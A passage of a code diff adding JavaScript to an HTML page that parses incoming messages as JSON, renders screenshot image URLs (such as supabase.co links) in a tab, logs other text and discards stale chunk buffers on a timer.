+      else pick = Math.min(idxObj, idxArr);
+
+      if (pick !== -1) {
+        const possible = trimmed.substring(pick);
+        const parsed2 = tryParseJSON(possible);
+        if (parsed2 !== null) {
+          const routed2 = routeParsedPayload(parsed2);
+          if (!routed2) pushLog("ℹ️ Parsed JSON after trimming metadata but not routed.");
+          return;
+        }
+      }
+
+      // If not JSON, display raw text in logs and also search for supabase URL (screenshots)
+      if (trimmed.includes("supabase.co") || trimmed.match(/^https?:\/\/.+\.(jpg|png|jpeg|webp)/i)) {
+        // find URLs (very simple regex)
+        const urlRegex = /(https?:\/\/\S+\.(?:png|jpe?g|webp|gif|svg|bin|jpg))(?:\s|$)/ig;
+        const urls = [];
+        let mm;
+        while ((mm = urlRegex.exec(trimmed)) !== null) urls.push(mm[1]);
+        if (urls.length) { renderScreenshots(urls); showTab("screenshots"); return; }
+      }
+
+      // fallback — append to logs
+      pushLog("📄 " + trimmed);
+    }
+
+    // cleanup old chunk entries periodically (in case some never complete)
+    setInterval(() => {
+      const now = Date.now();
+      for (const [k, v] of chunkBuffer) {
+        if (now - v.lastTs > 60_000) { // 60s
+          chunkBuffer.delete(k);
+          pushLog("⚠️ Discarded incomplete chunk buffer: " + k);
+        }
+      }
+    }, 15_000);
+
+    // expose pushRemoteLog
     window.pushRemoteLog = pushLog;
+
+    // Good initial UI state
+    showTab("logs");
   </script>
 </body>
 </html>
